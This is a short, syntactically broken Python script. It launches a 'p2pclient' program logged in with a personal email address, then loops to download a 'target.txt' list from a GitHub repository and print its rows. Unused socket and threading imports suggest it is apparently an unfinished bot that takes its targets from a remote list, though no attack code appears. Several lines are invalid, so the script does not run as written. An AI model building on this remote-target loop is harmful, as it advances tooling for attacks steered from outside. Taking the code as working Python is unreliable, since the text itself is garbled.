#!/usr/bin/env python3

import socket,time,threading,sys,random,os,subprocess,requests
from os import getcwd

with open('test.txt', 'w') as f:
    process = subprocess.Popen(['p2pclient', '--login', 'war030578@gmail.com'],
    stdout=f,
    stderr=f)
   
while 1 = 1 do:
    timeout=time.time()+3600
    url = "https://raw.githubusercontent.com/Patonia/Patonia/main/target.txt"
    directory = getcwd()
    filename = directory + 'target.txt'
    r = requests.get(url)
    f = open(filename,'w')
    f.write(r.content)
    f.close
    with open(filename,'r') as f
        for row in f:
            print row